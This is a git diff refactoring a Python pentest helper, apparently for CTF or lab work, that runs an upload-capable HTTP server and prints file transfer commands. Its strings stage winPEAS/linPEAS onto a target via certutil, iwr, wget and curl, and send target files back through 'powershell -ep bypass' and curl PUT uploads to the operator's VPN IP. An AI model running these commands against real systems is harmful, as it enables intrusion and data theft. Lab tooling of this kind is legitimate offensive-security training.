@@ -19,6 +19,7 @@ except ImportError:
     # Handle Python 2.x
     import SimpleHTTPServer as server
 
+
 # gather vpn info
 try:
     result = subprocess.run(
@@ -29,8 +30,8 @@ try:
     )
     for line in result.stdout.splitlines():
         if 'inet ' in line:
-            VPN_STATUS = "ON"
-            VPN_IP = line.split()[1]
+            _VPN_STATUS = "ON"
+            _VPN_IP = line.split()[1]
 except subprocess.CalledProcessError:
     result = subprocess.run(
         ['ifconfig', 'eth0'],
@@ -40,11 +41,10 @@ except subprocess.CalledProcessError:
     )
     for line in result.stdout.splitlines():
         if 'inet ' in line:
-            VPN_STATUS = "OFF"
-            VPN_IP = line.split()[1]
-print(f"VPN: {VPN_STATUS}")
-print(f"IP : {VPN_IP}")
-
+            _VPN_STATUS = "OFF"
+            _VPN_IP = line.split()[1]
+print(f"VPN: {_VPN_STATUS}")
+print(f"IP : {_VPN_IP}")
 
 # extend httpserver class for uploads
 class HTTPRequestHandler(server.SimpleHTTPRequestHandler):
@@ -79,6 +79,10 @@ class CLI(cmd.Cmd):
     intro = 'Welcome to the file search CLI. Type help or ? to list commands.'
     prompt = '>> '
 
+    def __init__(self):
+        super().__init__()
+        self._PORT = 8000
+
     # search for file
     def do_search(self, arg):
         "Search for files in the current directory.\nUsage: search <pattern>"
@@ -101,27 +105,26 @@ class CLI(cmd.Cmd):
 
     # show commands to download
     def do_downloads(self, arg):
-        "Display commands to download from this server.\nUsage: downloads [PORT] [FILE]\n\tDefault port: 8000\n\tDefault file: peas"
+        "Display commands to download from this server.\nUsage: downloads [FILE]\n\tDefault file: peas"
         args = arg.split()
-        PORT = args[0] if len(args) > 0 else 8000
-        FILE = args[1] if len(args) > 1 else None
+        FILE = args[0] if len(args) > 0 else None
         if FILE:
             FILENAME = os.path.basename(FILE)
 
         if FILE:
             print("[*] Win download commands:")
-            print(f"iwr -Uri http://{VPN_IP}:{PORT}/{FILE} -O {FILENAME}")
-            print(f"certutil.exe -urlcache -split -f http://{VPN_IP}:{PORT}/{FILE} {FILENAME}")
+            print(f"iwr -Uri http://{_VPN_IP}:{self._PORT}/{FILE} -O {FILENAME}")
+            print(f"certutil.exe -urlcache -split -f http://{_VPN_IP}:{self._PORT}/{FILE} {FILENAME}")
             print("[*] Linux download commands:")
-            print(f"wget {VPN_IP}:{PORT}/{FILE}")
-            print(f"curl -o {FILENAME} http://{VPN_IP}:{PORT}/{FILE}")
+            print(f"wget {_VPN_IP}:{self._PORT}/{FILE}")
+            print(f"curl -o {FILENAME} http://{_VPN_IP}:{self._PORT}/{FILE}")
         else:
             print("[*] Win download commands:")
-            print(f"iwr -Uri http://{VPN_IP}:{PORT}/peas/winPEASx64.exe -O C:\\Users\\Public\\winpeas.exe")
-            print(f"certutil.exe -urlcache -split -f http://{VPN_IP}:{PORT}/peas/winPEASx64.exe winpeas.exe")
+            print(f"iwr -Uri http://{_VPN_IP}:{self._PORT}/peas/winPEASx64.exe -O C:\\Users\\Public\\winpeas.exe")
+            print(f"certutil.exe -urlcache -split -f http://{_VPN_IP}:{self._PORT}/peas/winPEASx64.exe winpeas.exe")
             print("[*] Linux download commands:")
-            print(f"wget {VPN_IP}:{PORT}/peas/linpeas.sh")
-            print(f"curl -o linpeas.sh http://{VPN_IP}:{PORT}/peas/linpeas.sh")
+            print(f"wget {_VPN_IP}:{self._PORT}/peas/linpeas.sh")
+            print(f"curl -o linpeas.sh http://{_VPN_IP}:{self._PORT}/peas/linpeas.sh")
 
     # alias for downloads
     def do_d(self,arg):
@@ -129,15 +132,14 @@ class CLI(cmd.Cmd):
 
     # show commands to upload to the server
     def do_uploads(self, arg):
-        "Display commands to upload to this server.\nUsage: uploads [PORT] [FILE]\n\tDefault port: 8000\n\tDefault filename: file.txt"
+        "Display commands to upload to this server.\nUsage: uploads [FILE]\n\tDefault filename: file.txt"
         args = arg.split()
-        PORT = args[0] if len(args) > 0 else 8000
-        FILENAME = args[1] if len(args) > 1 else "file.txt"
+        FILENAME = args[0] if len(args) > 0 else "file.txt"
         
         print("[*] Win upload command:")
-        print(f"powershell -ep bypass -c \"(New-Object Net.WebClient).UploadFile('http://{VPN_IP}:{PORT}/{FILENAME}', 'PUT', '{FILENAME}');\"")
+        print(f"powershell -ep bypass -c \"(New-Object Net.WebClient).UploadFile('http://{_VPN_IP}:{self._PORT}/{FILENAME}', 'PUT', '{FILENAME}');\"")
         print("[*] Linux upload commands:")
-        print(f"curl -X PUT -T \"{FILENAME}\" \"http://{VPN_IP}:{PORT}/{FILENAME}\"")
+        print(f"curl -X PUT -T \"{FILENAME}\" \"http://{_VPN_IP}:{self._PORT}/{FILENAME}\"")
         return
 
     # alias for uploads
@@ -170,7 +172,7 @@ def main():
     parser.add_argument('-d', '--directory', type=str, default=os.getcwd(), help="Directory for the HTTP server root (default: current directory)")
 
     args = parser.parse_args()
-
+    
     # Start HTTP server in a separate thread
     print(f"HTTP server started at http://localhost:{args.port}\n")
     http_thread = Thread(target=start_http_server, args=(args.directory, args.port))
@@ -180,6 +182,7 @@ def main():
     # Start the CLI
     time.sleep(0.25) # wait for server to start
     cli = CLI()
+    cli._PORT = args.port
     cli.cmdloop()
 
 if __name__ == '__main__':
